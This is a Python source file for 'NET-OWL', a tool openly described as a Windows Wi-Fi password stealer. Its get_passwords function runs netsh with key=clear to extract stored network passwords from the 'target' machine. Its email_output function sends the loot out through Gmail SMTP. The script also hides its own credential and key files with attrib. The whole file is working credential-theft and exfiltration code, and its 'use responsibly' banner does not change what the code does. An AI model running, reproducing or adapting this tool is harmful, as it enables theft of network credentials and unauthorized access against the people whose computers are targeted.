#!/usr/bin/python
# NET-OWL, Windows Wifi Password Exfiltrator
# Created By : Chris Taylor [C0SM0]

# module importing
import os
import getpass
import random as r
from termcolor import colored  # pip install this
from datetime import date, datetime
from smtplib import SMTP_SSL as SMTP
from email.mime.text import MIMEText
from cryptography.fernet import Fernet  # pip install this

# color variables for status representation
confirmation_status_color = 'cyan'
error_status_color = 'red'
input_status_color = 'white'
source_status_color = 'yellow'
title_color = 'magenta'
banner_color = 'green'

# colored variables
lsa_link = colored('"https://myaccount.google.com/lesssecureapps?"', source_status_color)  # less secure apps [lsa]
    # colored user input [option menu]
option0 = colored('0) ', source_status_color)
option1 = colored('1) ', source_status_color)
option2 = colored('2) ', source_status_color)
option3 = colored('3) ', source_status_color)
option4 = colored('4) ', source_status_color)
option5 = colored('5) ', source_status_color)
add_creds = colored('Add Gmail Credentials', input_status_color)
email_loot = colored('Email Output', input_status_color)
loot_file = colored('File Output', input_status_color)
term_output = colored('Terminal Output', input_status_color)
help_menu = colored('Help', input_status_color)
exit_code = colored('Exit', input_status_color)
    # colored bullet points [help menu]
bullet_point = colored('* ', source_status_color)


# generate loot file
def password_file_generator():
    target_user = getpass.getuser()
    current_date = date.today()
    full_time = datetime.now()
    time = f'{full_time.hour}-{full_time.minute}-{full_time.second}'

    # creates file based on targets username, date, and time
    output_file = f'{target_user}-Date_{current_date}-Time_{time}-passwords.txt'

    return output_file

# databases [db]
pass_file = password_file_generator()  # pass_db
accounts_file = 'credentials.txt'  # account_db
key_file = 'encrypted.key'  # key_db

# generates random banner
def banner_generator():
    graffiti = ' _______          __            ________         .__\n' \
              ' \      \   _____/  |_          \_____  \__  _  _|  |  \n' \
              ' /   |   \_/ __ \   __\  ______  /   |   \ \/ \/ /  | \n' \
              '/    |    \  ___/|  |   /_____/ /    |    \     /|  |__\n' \
              '\____|__  /\___  >__|           \_______  /\/\_/ |____/\n' \
              '        \/     \/                       \/             '

    doom = ' _   _      _          _____          _\n' \
           '| \ | |    | |        |  _  |        | |\n' \
           '|  \| | ___| |_ ______| | | |_      _| |\n' \
           '| . ` |/ _ \ __|______| | | \ \ /\ / / |\n' \
           '| |\  |  __/ |_       \ \_/ /\ V  V /| |\n' \
           '\_| \_/\___|\__|       \___/  \_/\_/ |_|'

    lean = '    _/      _/              _/                    _/_/                        _/ \n' \
           '   _/_/    _/    _/_/    _/_/_/_/              _/    _/  _/      _/      _/  _/    \n' \
           '  _/  _/  _/  _/_/_/_/    _/      _/_/_/_/_/  _/    _/  _/      _/      _/  _/     \n' \
           ' _/    _/_/  _/          _/                  _/    _/    _/  _/  _/  _/    _/     \n' \
           '_/      _/    _/_/_/      _/_/                _/_/        _/      _/      _/   '

    banner_list = (graffiti, doom, lean)

    return r.choice(banner_list)

# encryption functions
    # unlocks key file
def unlock_key(key_db, accounts_db):
    os.system(f'attrib -h -s -r {key_db}')
    os.system(f'attrib -h -s -r {accounts_db}')

    # locks key file
def lock_key(key_db, accounts_db):
    os.system(f'attrib +h +s +r {key_db}')
    os.system(f'attrib +h +s +r {accounts_db}')

    # create encryption key
def create_key(key_db):
    created_key = Fernet.generate_key()

    with open(key_db, 'wb') as db:
        db.write(created_key)

    return created_key

    # load encryption key
def load_key(key_db):
    return open(key_db, 'rb').read()

    # validates encryption key
def key_checker(key_db):
    with open(key_db, 'r') as db:
        fkey = db.read()

    if fkey.endswith('='):
        checked_key = fkey.encode()

    else:
        checked_key = create_key(key_db)

    return checked_key

    # encryption method
def encryption_process(account_db, key):
    f = Fernet(key)

    with open(account_db, 'rb') as db:
        original_data = db.read()

    encrypted_data = f.encrypt(original_data)

    with open(account_db, 'wb') as db:
        db.write(encrypted_data)

    return encrypted_data

    # decryption method
def decryption_process(account_db, key):
    f = Fernet(key)

    with open(account_db, 'rb') as db:
        encrypted_data = db.read()

    decrypted_data = f.decrypt(encrypted_data)

    with open(account_db, 'wb') as db:
        db.write(decrypted_data)

    return str(decrypted_data)

    # checks and decrypts credentials file
def cred_checker(account_db, key):
    with open(account_db, 'r') as db:
        read_db = db.read()

    # checks if file is encrypted
    if read_db.startswith('gAA'):
        decrypted_db = decryption_process(account_db, key)
        encryption_process(account_db, key)
        return decrypted_db

    # checks if file is decrypted
    elif '||' in read_db:
        encryption_process(account_db, key)
        return read_db

    else:
        pass


# Hacking Functions
    # obtain wifi passwords, required for options 1-3
def get_passwords():
    # temporarily stores credentials
    creds = []

    # gathers network names
    networks = [line.split(': ')[1] for line in os.popen('netsh wlan show profile').read().splitlines() if
                'User Profile' in line]

    # start wifi hacking
    print(colored('\nHacking Network[s]...\n', confirmation_status_color))

    for network in networks:
        os.system(f'netsh wlan show profile name="{network}" key=clear > wifi.txt')

        # temporarily stores wifi password output
        with open('wifi.txt', 'r') as f:
            read_file = f.readlines()

            # extracts password
            for line in read_file:
                exfiltrated_creds = line
                if line.startswith('    Key Content'):
                    appended_cred = f'{network} = {exfiltrated_creds}'
                    creds.append(appended_cred)
                    print(colored(f'Hacking "{network}" Success!', confirmation_status_color))

                else:
                    continue

    # saves looted passwords to string
    looted = '\n'
    for cred in creds:
        looted += cred

    # clears temporary file
    with open('wifi.txt', 'w') as f:
        f.write('')

    return looted

# option functions
    # add users gmail credentials, option 0
def credentials(account_db, key):
    print(colored('\n*Input Will Be Encrypted*\n', error_status_color))

    # obtain credentials
    email = input(colored('Enter Gmail : ', input_status_color))
    password = input(colored('Enter Gmail\'s Password : ', input_status_color))

    # formats account credentials to file
    account_format = f'{email}||{password}'.encode()

    with open(account_db, 'wb') as db:
        db.write(account_format)
        print(colored('\nAccount Created', confirmation_status_color))

    encryption_process(account_db, key)
    print(colored('Account Encrypted', confirmation_status_color))

    # checks gmail credentials, option 1
def email_output(pass_db, checked_cred, loot):
    if '||' in checked_cred:
        print(colored('\nDecrypting Gmail Credentials...', source_status_color))
        account = checked_cred.strip()  # plaintext account credentials, automatically encrypted in case of error
        print(colored('Credentials Obtained!', banner_color))
        print(colored('Encrypting Gmail Credentials...', source_status_color))

        account_cred = account.split('||')

        # extracted email credentials
        # extract email
        account_email = account_cred[0]
        account_email = account_email[2:]

        # extract password
        account_pass = account_cred[1]
        account_pass = account_pass[:-1]

        # emails looted wifi credentials
        try:
            print(colored('\nEmailing loot...', confirmation_status_color))
            message = MIMEText(loot, 'plain')
            message['To'] = account_email
            message['Subject'] = pass_db

            email_server = SMTP('smtp.gmail.com')
            email_server.login(account_email, account_pass)
            email_server.sendmail(account_email, account_email, message.as_string())
            email_server.quit()
            print(colored(f'Loot Emailed to "{account_email}"', confirmation_status_color))

        # error detection
        except:
            print(colored('\nAuthentication Declined Because :', error_status_color))
            print(colored('*Your email or password may be wrong\n'
                          '*Not a gmail account\n'
                          '*Allowing less secure apps is off\n\t'
                          f'-Turn on by navigating to {lsa_link}', error_status_color))

    # error detection
    else:
        print(colored('\nNo Accounts or Encryption Key Exist, Fix With Option "0"', error_status_color))

    # write loot to file, option 2
def file_output(output_file, loot):
    print(colored('\nWriting loot to File...', confirmation_status_color))
    with open(output_file, 'w') as f:
        f.write(loot)
    print(colored(f'Loot Written to "{output_file}"', confirmation_status_color))

    # help menu, option 4
def help_screen():
    print(colored('\nWelcome to Net-Owl\n'
                  'A Windows Wifi Password Exfiltrator\n'
                  'The Result of a 50-hour Programing Challenge\n', banner_color))

    # system requirements
    print(colored('\nRequirements :', title_color))
    print(bullet_point + colored('python3 [pip]', input_status_color))
    print(bullet_point + colored('Windows Computer', input_status_color))
    print(bullet_point + colored('*Gmail Account [Personal Account Not Suggested]', input_status_color))
    print(bullet_point + colored('*Gmail Must Allow Less Secure Apps', input_status_color))
    print(bullet_point + colored('\t-Activated by Navigating to {lsa_link}', input_status_color))

    # instructions
    print(colored('\nInstructions :', title_color))
    print(bullet_point + colored('Use Responsibly', input_status_color))
    print(bullet_point + colored('Use "installer.bat" to Install All Dependencies', input_status_color))
    print(bullet_point + colored('Open Directory in CMD', input_status_color))
    print(bullet_point + colored('Run Using "py -3.8 net-owl.py', input_status_color))
    print(bullet_point + colored('Use Number Keys to Choose option', input_status_color))

    # options menu
    print(colored('\nOptions :', title_color))
    print(bullet_point + colored('(0) Adds Gmail Credentials to Database [Database is Encrypted]', input_status_color))
    print(bullet_point + colored('(1) Emails User Wifi Credentials', input_status_color))
    print(bullet_point + colored('(2) Outputs Wifi Credentials to text file', input_status_color))
    print(bullet_point + colored('(3) Outputs Wifi Credentials in The Open Terminal or Command Line', input_status_color))
    print(bullet_point + colored('(4) Opens This Help Menu', input_status_color))
    print(bullet_point + colored('(5) Exits Program', input_status_color))

    # credits
    print(colored('\n\nCreds to : Chris Taylor [C0SM0]\n', source_status_color))


# main code
def net_owl_main():
    while True:

        # clears terminal
        os.system('cls' if os.name == 'nt' else 'clear')

        # banner
        banner = banner_generator()
        print(colored(banner, banner_color))
        print(colored('\t\t\t=Windows Wifi Password Stealer=', source_status_color))
        print(colored('\t\t\t   Created By : Chris Taylor\n', source_status_color))

        print(colored('[!] Do Not Use Code With Malicious Intent, Use Responsibly\n', error_status_color))

        # temporarily unlocks encryption key and credentials file, saves key and credentials
        unlock_key(key_file, accounts_file)
        key = key_checker(key_file)

        # user input
        print(colored('Choose an Option :', title_color))
        print(f'\n\t{option0} {add_creds}\n\t'
              f'{option1} {email_loot} \n\t'
              f'{option2} {loot_file}\n\t'
              f'{option3} {term_output}\n\t'
              f'{option4} {help_menu}\n\t'
              f'{option5} {exit_code}\n\n')

        option = input(colored('Option : ', input_status_color))

        # email option [0]
        if option == '0':
            credentials(accounts_file, key)
            lock_key(key_file, accounts_file)  # locks key
            break

        # email option [1]
        elif option == '1':
            try:
                email_output(pass_file, cred_checker(accounts_file, key), get_passwords())

            except:
                print(colored('\nNo Accounts Exist, Add an Account With Option "0"', error_status_color))

            lock_key(key_file, accounts_file)  # locks key
            break

        # file option [2]
        elif option == '2':
            file_output(pass_file, get_passwords())
            break

        # terminal option [3]
        elif option == '3':
            passwords = get_passwords()
            print(colored('\nResults :', title_color) + colored(passwords, input_status_color))
            break

        # help option [4]
        elif option == '4':
            help_screen()
            break

        # exit option [5]
        elif option == '5':
            print(colored('\nExiting...', confirmation_status_color))
            break

        # exception, error detection
        else:
            print(colored('\nInput Not Recognized, Try Again!', error_status_color))
            break

# runs code appropriately if file is ran or imported
if __name__ == '__main__':
    net_owl_main()
